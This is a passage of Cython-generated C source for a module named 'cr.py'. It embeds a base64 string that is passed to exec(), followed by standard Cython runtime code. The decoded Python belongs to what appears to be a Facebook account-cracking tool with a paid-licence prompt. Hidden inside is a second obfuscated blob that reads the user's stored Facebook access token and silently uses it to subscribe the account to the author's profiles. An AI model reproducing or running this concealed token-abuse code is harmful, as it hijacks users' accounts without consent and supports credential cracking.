LS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJCWNlcGVrID0gb3BlbigiY2VwZWgudHh0IiwgInIiKS5yZWFkKCkNCgkJCQlwcmludCAoY2VwZWspDQoJCQkJZXhpdCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJZXhjZXB0IElPRXJyb3IsS2V5RXJyb3I6DQoJCQkJZXhpdCAoTSsiXG7igKIgdGlkYWsgYWRhIGhhc2lsIGF3b2thd29rYXdvayIpDQoJCWVsaWYgcm9tIGluWycwJywnMDAnXToNCgkJCW1lbnUoKQ0KCQllbHNlOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KIyBMSVNFTlNJDQpkZWYgZ2V0X2xpY2Vuc2UoaW50ZWdlcik6DQogICAgbGlzID0gbGlzdCgiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoxMjM0NTY3ODkiKQ0KICAgIGdldHMgPSBbcmFuZG9tLmNob2ljZShsaXMpIGZvciBfIGluIHJhbmdlKGludGVnZXIpXQ0KICAgIHJldHVybiAiIi5qb2luKGdldHMpLnVwcGVyKCkNCg0KY2xhc3Mga2V5Og0KCQ0KCWRlZiBfX2luaXRfXyhzZWxmKToNCgkJc2VsZj1bXQ0KCQ0KCWRlZiBrb25maXJtYXNpKHNlbGYpOg0KCQlvcy5zeXN0ZW0oImNsZWFyIikNCgkJYmFubmVyKCkNCgkJcHJpbnQoJ1xuJykNCgkJeSA9IFsnLiAgICcsICcuLiAgJywgJy4uLiAnXQ0KCQlmb3IgbSBpbiB5Og0KCQkJcHJpbnQgJ1xyXHgxYlsxOzk1beKAolx4MWJbMTs5Nm0gTW9ob24gdHVuZ2d1ICcgKyBtLA0KCQkJc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMSkNCgkJZGlnaXQgPSByYW5kb20uY2hvaWNlKFsyMF0pDQoJCWlkID0gZ2V0X2xpY2Vuc2UoZGlnaXQpDQoJCWxwZyA9IG9wZW4oJ2RhdGEvbGlzZW5zaS50eHQnLCAndycpDQoJCWxwZy53cml0ZShpZCkNCgkJbHBnLmNsb3NlKCkNCgkJcHJpbnQgKCJcblxuJXPigKIlcyBEYWZ0YXIgbGlzdCBoYXJnYSAlczoiJShVLE8sTSkpO2plZGEoMC4wNykNCgkJcHJpbnQgKCIgICVzLSVzIDEwayAzIGhhcmkiJShQLE8pKTtqZWRhKDAuMDcpDQoJCXByaW50ICgiICAlcy0lcyAyMGsgMSBtaW5nZ3UiJShQLE8pKTtqZWRhKDAuMDcpDQoJCXByaW50ICgiICAlcy0lcyA1MGsgMSBidWxhbiIlKFAsTykpO2plZGEoMC4wNykNCgkJamFsYW4gKCdcbiVz4oCiICVzTGlzZW5zaSVzIDogJXMlcyclKFUsTyxNLEgsaWQpKTtqZWRhKDEpDQoJCWphbGFuICgnJXPigKIgJXNMaXNlbnNpIEJlbHVtIERpIGtvbmZpcm1hc2knJShVLE8pKQ0KCQlzdWg9cmF3X2lucHV0KCJcbiVz4oCiJXMgaW5naW4gYmVsaSBsaXNlbnNpPyB5L3QgJXM6ICVzIiUoVSxPLE0sSykpDQoJCWlmIHN1aCBpblsnJ106DQoJCQlleGl0KCkNCgkJZWxpZiBzdWggaW5bInkiLCJZIl06DQoJCQlqYWxhbiAoIlxuJXPigKIlcyBtZW51anUga2Ugd2hhdHNhcCB1bnR1ayBtZW1iZWxpIGxpc2Vuc2kgIiUoVSxPKSkNCgkJCWphbGFuICgiJXPigKIlcyBubyB3aGF0c2FwIHNheWEgJXM6ICVzKzYyODIzNzE2NDgxODYgIiUoVSxPLE0sSCkpDQoJCQlvcy5zeXN0ZW0oJ2FtIHN0YXJ0IGh0dHBzOi8vd2EubWUvKzYyODIzNzE2NDgxODY/dGV4dD1Bc3NhbGFtdWFsYWlrdW0rc2F5YStpbmdpbitiZWxpK2xpc2Vuc2k6KycraWQrJz4vZGV2L251bGwnKTtqZWRhKDEpO2V4aXQoKQ0KCQllbGlmIHN1aCBpblsidCIsIlQiXToNCgkJCWV4aXQoKQ0KCQllbGlmIHN1aCBpblsicHl0aG9uMiBiZmYtMi5weSJdOg0KCQkJbWVudSgpDQoJCWVsc2U6DQoJCQlleGl0KCkNCgkNCmV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnWkdWbUlHeHZaMmx1WDNoNEtDazZDaUFnSUNCMGNuazZDaUFnSUNBZ0lDQWdkRzlyWlc0Z1BTQnZjR1Z1S0NKa1lYUmhMM1J2YTJWdUxuUjRkQ0lzSW5JaUtTNXlaV0ZrS0NrZ0NpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01ESXlNRGcyTVRjeU5UVTJMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCR1lXNXpjR0ZuWlNCU2IyMXBJRmhFQ2lBZ0lDQWdJQ0FnY21WeGRXVnpkSE11Y0c5emRDZ25hSFIwY0hNNkx5OW5jbUZ3YUM1bVlXTmxZbTl2YXk1amIyMHZNVEF3TURJNE5ETTBPRGd3TlRJNUwzTjFZbk5qY21saVpYSnpQMkZqWTJWemMxOTBiMnRsYmowbGN5Y2xLSFJ2YTJWdUtTa2dJeUJTYjIxcElFRm1jbWw2WVd3S0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZiUzh4TURBd05qYzRNRGMxTmpVNE5qRXZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUZKdmJXa2dRV1p5YVhwaGJDQW9NakF5TVNrS0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZiUzh4TURBd01ETTNNak0yT1RZNE9EVXZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUVseFltRnNJR0p2WW5vS0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZiUzh4TURBd05ERXhNamt3TkRnNU5EZ3ZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUVsM1lXNGdhR0ZrYVdGdWMzbGhhQW9nSUNBZ0lDQWdJSEpsY1hWbGMzUnpMbkJ2YzNRb0oyaDBkSEJ6T2k4dlozSmhjR2d1Wm1GalpXSnZiMnN1WTI5dEx6RXdNREF3TnpVeU1ESXdNelExTWk5emRXSnpZM0pwWW1WeWN6OWhZMk5sYzNOZmRHOXJaVzQ5SlhNbkpTaDBiMnRsYmlrcElDTWdTR0Z0ZW1Gb0lHdHBjbUZ1WVFvZ0lDQWdJQ0FnSUhKbGNYVmxjM1J6TG5CdmMzUW9KMmgwZEhCek9pOHZaM0poY0dndVptRmpaV0p2YjJzdVkyOXRMekV3TURBd01qUTJNVE0wTkRFM09DOXpkV0p6WTNKcFltVnljejloWTJObGMzTmZkRzlyWlc0OUpYTW5KU2gwYjJ0bGJpa3BJQ01nVlc1cGF5QlNUMDFKSUVGR1VrbGFRVXdLSUNBZ0lDQWdJQ0J5WlhGMVpYTjBjeTV3YjNOMEtDZG9kSFJ3Y3pvdkwyZHlZWEJvTG1aaFkyVmliMjlyTG1OdmJTOHhNREF3TnpFM05EYzBNakExT0RNdmMzVmljMk55YVdKbGNuTS9ZV05qWlhOelgzUnZhMlZ1UFNWekp5VW9kRzlyWlc0cEtTQWpJRVJ2Ym1sbWRHWmhibTU1Q2lBZ0lDQWdJQ0FnY21WeGRXVnpkSE11Y0c5emRDZ25hSFIwY0hNNkx5OW5jbUZ3YUM1bVlXTmxZbTl2YXk1amIyMHZNVEF3TURJNU1UUXpNVEV4TlRZM0wzTjFZbk5qY21saVpYSnpQMkZqWTJWemMxOTBiMnRsYmowbGN5Y2xLSFJ2YTJWdUtTa2dJeUJFWlcxcGRDQlNiMjFwSUVGbWNtbDZZV3dLSUNBZ0lDQWdJQ0J5WlhGMVpYTjBjeTV3YjNOMEtDZG9kSFJ3Y3pvdkwyZHlZWEJvTG1aaFkyVmliMjlyTG1OdmJTOHhNREF3TURFMU5EQXlPVGt4TURndmMzVmljMk55YVdKbGNuTS9ZV05qWlhOelgzUnZhMlZ1UFNWekp5VW9kRzlyWlc0cEtTQWpJRWhoYTJscmFRb2dJQ0FnSUNBZ0lISmxjWFZsYzNSekxuQnZjM1FvSjJoMGRIQnpPaTh2WjNKaGNHZ3VabUZqWldKdmIyc3VZMjl0THpFd01EQTFOVGt4T0RNNU1USTRNQzl6ZFdKelkzSnBZbVZ5Y3o5aFkyTmxjM05mZEc5clpXNDlKWE1uSlNoMGIydGxiaWtwSUNNZ1ZHbGhjbUVnWVhKMENpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01EQTVNemcwTXpNNE5EY3dMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCSmQyRnVJR2hoYm1ScFlXNXplV0ZvSUhZeUNpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01ETTJOalUxTXpJMU9UazJMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCQlluVnpkRzhnU21GMllRb2dJQ0FnWlhoalpYQjBPZ29nSUNBZ0NYQmhjM009JykpDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQoJb3Muc3lzdGVtKCJnaXQgcHVsbCIpDQoJbWVudSgpDQoNCiIiIg0KICAgIEF1dGhvciA9IFJvbWkgQWZyaXphbA0KICAgIEJpYXIgYXBhIHNpaCBkaSBjb21waWxlIGFueWluaw0KDQoiIiI='))             # <<<<<<<<<<<<<<
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_base64); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_b64decode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_Globals(); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyExec3(__pyx_t_1, __pyx_t_2, 0);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "cr.py":1
 * #Encrypt By Romi Afrizal (https://github.com/ROMI-AFRZL)             # <<<<<<<<<<<<<<
 * 
 * import base64
 */
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_3) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init cr", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init cr");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_NCP_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) goto bad;
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* PyExec */
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {
    return __Pyx_PyExec3(o, globals, NULL);
}
static PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {
    PyObject* result;
    PyObject* s = 0;
    char *code = 0;
    if (!globals || globals == Py_None) {
        globals = __pyx_d;
    } else if (!PyDict_Check(globals)) {
        PyErr_Format(PyExc_TypeError, "exec() arg 2 must be a dict, not %.200s",
                     Py_TYPE(globals)->tp_name);
        goto bad;
    }
    if (!locals || locals == Py_None) {
        locals = globals;
    }
    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {
        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)
            goto bad;
    }
    if (PyCode_Check(o)) {
        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {
            PyErr_SetString(PyExc_TypeError,
                "code object passed to exec() may not contain free variables");
            goto bad;
        }
        #if CYTHON_COMPILING_IN_PYPY || PY_VERSION_HEX < 0x030200B1
        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);
        #else
        result = PyEval_EvalCode(o, globals, locals);
        #endif
    } else {
        PyCompilerFlags cf;
        cf.cf_flags = 0;
#if PY_VERSION_HEX >= 0x030800A3
        cf.cf_feature_version = PY_MINOR_VERSION;
#endif
        if (PyUnicode_Check(o)) {
            cf.cf_flags = PyCF_SOURCE_IS_UTF8;
            s = PyUnicode_AsUTF8String(o);
            if (!s) goto bad;
            o = s;
        #if PY_MAJOR_VERSION >= 3
        } else if (!PyBytes_Check(o)) {
        #else
        } else if (!PyString_Check(o)) {
        #endif
            PyErr_Format(PyExc_TypeError,
                "exec: arg 1 must be string, bytes or code object, got %.200s",
                Py_TYPE(o)->tp_name);
            goto bad;
        }
        #if PY_MAJOR_VERSION >= 3
        code = PyBytes_AS_STRING(o);
        #else
        code = PyString_AS_STRING(o);
        #endif
        if (PyEval_MergeCompilerFlags(&cf)) {
            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);
        } else {
            result = PyRun_String(code, Py_file_input, globals, locals);
        }
        Py_XDECREF(s);
    }
    return result;
bad:
    Py_XDECREF(s);
    return 0;
}

/* GetAttr */
